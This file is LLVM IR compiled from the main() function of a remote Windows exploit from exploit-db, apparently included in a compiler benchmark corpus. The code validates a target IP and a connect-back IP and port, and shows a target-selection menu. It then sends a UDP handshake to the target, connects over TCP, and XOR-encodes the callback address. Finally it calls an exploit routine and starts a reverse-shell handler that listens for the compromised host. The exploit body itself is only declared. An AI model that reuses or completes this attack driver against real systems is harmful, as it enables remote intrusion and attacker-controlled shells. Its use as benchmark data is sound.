; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_953.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_953.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i8* }
%struct.sockaddr_in = type { i16, %struct.in_addr, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [32 x i8] c"Usage: %s <ip> <cbip> <cbport>\0A\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"Invalid Target IP!\0A\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"Invalid connect back IP!\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"--[ select target\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"--[ %d [0x%08x] %s\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.6 = private unnamed_addr constant [5 x i8] c" >> \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"--[ invalid target!\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [21 x i8] c"cannot resolve \22%s\22\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT_UDP = common dso_local global i16 0, align 2
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [16 x i8] c"socket failed!\0A\00", align 1
@.str.11 = private unnamed_addr constant [19 x i8] c"handshake FAILED!\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [33 x i8] c"--[ connecting to %s:%u [TCP]...\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"failed!\0A\00", align 1
@.str.14 = private unnamed_addr constant [7 x i8] c"done!\0A\00", align 1
@.str.15 = private unnamed_addr constant [22 x i8] c"exploitation FAILED!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i16, align 2
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.hostent*, align 8
  %16 = alloca { i64, i32 }, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp ne i32 %17, 4
  br i1 %18, label %19, label %25

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i8* %22)
  %24 = call i32 @exit(i32 1) #4
  unreachable

25:                                               ; preds = %2
  %26 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %27 = call i32 (...) @header()
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @isip(i8* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %36, label %33

33:                                               ; preds = %25
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %35 = call i32 @exit(i32 1) #4
  unreachable

36:                                               ; preds = %25
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 2
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @isip(i8* %39)
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %45, label %42

42:                                               ; preds = %36
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  %44 = call i32 @exit(i32 1) #4
  unreachable

45:                                               ; preds = %36
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %47

47:                                               ; preds = %70, %45
  %48 = load i32, i32* %9, align 4
  %49 = icmp slt i32 %48, 2
  br i1 %49, label %50, label %73

50:                                               ; preds = %47
  %51 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %52 = load i32, i32* %9, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i64 %53
  %55 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 8
  %57 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %58 = load i32, i32* %9, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %57, i64 %59
  %61 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %60, i32 0, i32 1
  %62 = load i32, i32* %61, align 4
  %63 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %64 = load i32, i32* %9, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %63, i64 %65
  %67 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %66, i32 0, i32 2
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i32 %56, i32 %62, i8* %68)
  br label %70

70:                                               ; preds = %50
  %71 = load i32, i32* %9, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %9, align 4
  br label %47

73:                                               ; preds = %47
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %75 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32* %8)
  %76 = load i32, i32* %8, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %85

78:                                               ; preds = %73
  %79 = load i32, i32* %8, align 4
  %80 = icmp ne i32 %79, 1
  br i1 %80, label %81, label %84

81:                                               ; preds = %78
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  %83 = call i32 @exit(i32 1) #4
  unreachable

84:                                               ; preds = %78
  br label %85

85:                                               ; preds = %84, %73
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 1
  %88 = load i8*, i8** %87, align 8
  %89 = call %struct.hostent* @gethostbyname(i8* %88)
  store %struct.hostent* %89, %struct.hostent** %15, align 8
  %90 = icmp eq %struct.hostent* %89, null
  br i1 %90, label %91, label %98

91:                                               ; preds = %85
  %92 = load i32, i32* @stderr, align 4
  %93 = load i8**, i8*** %5, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 1
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @fprintf(i32 %92, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0), i8* %95)
  %97 = call i32 @exit(i32 1) #4
  unreachable

98:                                               ; preds = %85
  %99 = load i32, i32* @AF_INET, align 4
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %99, i32* %100, align 4
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %102 = load %struct.hostent*, %struct.hostent** %15, align 8
  %103 = getelementptr inbounds %struct.hostent, %struct.hostent* %102, i32 0, i32 0
  %104 = load i64, i64* %103, align 8
  %105 = inttoptr i64 %104 to %struct.in_addr*
  %106 = bitcast %struct.in_addr* %101 to i8*
  %107 = bitcast %struct.in_addr* %105 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %106, i8* align 4 %107, i64 4, i1 false)
  %108 = load i16, i16* @PORT_UDP, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %108)
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 %109, i16* %110, align 4
  %111 = load i32, i32* @AF_INET, align 4
  %112 = load i32, i32* @SOCK_DGRAM, align 4
  %113 = load i32, i32* @IPPROTO_UDP, align 4
  %114 = call i32 @socket(i32 %111, i32 %112, i32 %113)
  store i32 %114, i32* %6, align 4
  %115 = icmp slt i32 %114, 0
  br i1 %115, label %116, label %119

116:                                              ; preds = %98
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0))
  %118 = call i32 @exit(i32 1) #4
  unreachable

119:                                              ; preds = %98
  %120 = load i32, i32* %6, align 4
  %121 = bitcast { i64, i32 }* %16 to i8*
  %122 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %121, i8* align 4 %122, i64 12, i1 false)
  %123 = getelementptr inbounds { i64, i32 }, { i64, i32 }* %16, i32 0, i32 0
  %124 = load i64, i64* %123, align 4
  %125 = getelementptr inbounds { i64, i32 }, { i64, i32 }* %16, i32 0, i32 1
  %126 = load i32, i32* %125, align 4
  %127 = call zeroext i16 @send_handshake(i32 %120, i64 %124, i32 %126)
  store i16 %127, i16* %13, align 2
  %128 = zext i16 %127 to i32
  %129 = icmp eq i32 %128, 1
  br i1 %129, label %130, label %133

130:                                              ; preds = %119
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.11, i64 0, i64 0))
  %132 = call i32 @exit(i32 1) #4
  unreachable

133:                                              ; preds = %119
  %134 = load i32, i32* %6, align 4
  %135 = call i32 @close(i32 %134)
  %136 = load i32, i32* @AF_INET, align 4
  %137 = load i32, i32* @SOCK_STREAM, align 4
  %138 = call i32 @socket(i32 %136, i32 %137, i32 0)
  store i32 %138, i32* %7, align 4
  %139 = icmp slt i32 %138, 0
  br i1 %139, label %140, label %143

140:                                              ; preds = %133
  %141 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0))
  %142 = call i32 @exit(i32 1) #4
  unreachable

143:                                              ; preds = %133
  %144 = load i8**, i8*** %5, align 8
  %145 = getelementptr inbounds i8*, i8** %144, i64 1
  %146 = load i8*, i8** %145, align 8
  %147 = load i16, i16* %13, align 2
  %148 = zext i16 %147 to i32
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.12, i64 0, i64 0), i8* %146, i32 %148)
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150)
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 %151, i16* %152, align 4
  %153 = load i32, i32* %7, align 4
  %154 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %155 = call i32 @connect(i32 %153, %struct.sockaddr* %154, i32 4)
  %156 = icmp eq i32 %155, -1
  br i1 %156, label %157, label %160

157:                                              ; preds = %143
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0))
  %159 = call i32 @exit(i32 1) #4
  unreachable

160:                                              ; preds = %143
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0))
  %162 = load i8**, i8*** %5, align 8
  %163 = getelementptr inbounds i8*, i8** %162, i64 2
  %164 = load i8*, i8** %163, align 8
  %165 = call i64 @inet_addr(i8* %164)
  %166 = xor i64 %165, 2576980377
  store i64 %166, i64* %10, align 8
  %167 = load i8**, i8*** %5, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 3
  %169 = load i8*, i8** %168, align 8
  %170 = call zeroext i16 @atoi(i8* %169)
  %171 = call zeroext i16 @htons(i16 zeroext %170)
  %172 = zext i16 %171 to i32
  %173 = xor i32 %172, 39321
  %174 = trunc i32 %173 to i16
  store i16 %174, i16* %12, align 2
  %175 = load i32, i32* %7, align 4
  %176 = load i64, i64* %10, align 8
  %177 = load i16, i16* %12, align 2
  %178 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %178, i64 %180
  %182 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = call i32 @exploit(i32 %175, i64 %176, i16 zeroext %177, i32 %183)
  %185 = icmp eq i32 %184, 1
  br i1 %185, label %186, label %189

186:                                              ; preds = %160
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.15, i64 0, i64 0))
  %188 = call i32 @exit(i32 1) #4
  unreachable

189:                                              ; preds = %160
  %190 = load i32, i32* %7, align 4
  %191 = call i32 @close(i32 %190)
  %192 = load i8**, i8*** %5, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @start_reverse_handler(i8* %194)
  %196 = load i32, i32* %3, align 4
  ret i32 %196
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @header(...) #1

declare dso_local i32 @isip(i8*) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local zeroext i16 @htons(i16 zeroext) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local zeroext i16 @send_handshake(i32, i64, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local i32 @exploit(i32, i64, i16 zeroext, i32) #1

declare dso_local i32 @start_reverse_handler(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
